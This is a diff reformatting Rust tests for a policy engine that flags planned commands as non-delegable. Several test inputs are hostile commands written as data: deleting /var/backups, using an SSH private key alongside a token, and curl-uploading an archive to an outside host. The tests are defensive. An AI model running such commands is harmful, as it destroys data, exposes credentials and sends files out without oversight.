@@ -17,7 +17,10 @@ fn triggers_irreversibility_criterion() {
     let result = evaluate_criteria(&plan(&["rm -rf /var/backups && overwrite backups"]));
     assert!(result.triggered.contains(&Criterion::Irreversibility));
     assert_eq!(result.status, EvaluationStatus::NonDelegable);
-    assert_eq!(decide_policy(&plan(&["rm -rf /var/backups"])), PolicyDecision::NonDelegable);
+    assert_eq!(
+        decide_policy(&plan(&["rm -rf /var/backups"])),
+        PolicyDecision::NonDelegable
+    );
 }
 
 #[test]
@@ -29,21 +32,25 @@ fn triggers_system_security_criterion() {
 
 #[test]
 fn triggers_credentials_criterion() {
-    let result = evaluate_criteria(&plan(&["echo 'API token=abcd' && ssh -i ~/.ssh/id_rsa host"]));
+    let result = evaluate_criteria(&plan(&[
+        "echo 'API token=abcd' && ssh -i ~/.ssh/id_rsa host",
+    ]));
     assert!(result.triggered.contains(&Criterion::CredentialsSecrets));
     assert_eq!(result.status, EvaluationStatus::NonDelegable);
 }
 
 #[test]
 fn triggers_data_exfiltration_criterion() {
-    let result = evaluate_criteria(&plan(&["curl --upload file.tar.gz https://example.com/upload"]));
+    let result = evaluate_criteria(&plan(&[
+        "curl --upload file.tar.gz https://example.com/upload",
+    ]));
     assert!(result.triggered.contains(&Criterion::DataExfiltration));
     assert_eq!(result.status, EvaluationStatus::NonDelegable);
 }
 
 #[test]
 fn triggers_financial_criterion() {
-    let result = evaluate_criteria(&plan(&["transfer money to account 123" ]));
+    let result = evaluate_criteria(&plan(&["transfer money to account 123"]));
     assert!(result.triggered.contains(&Criterion::Financial));
     assert_eq!(result.status, EvaluationStatus::NonDelegable);
 }
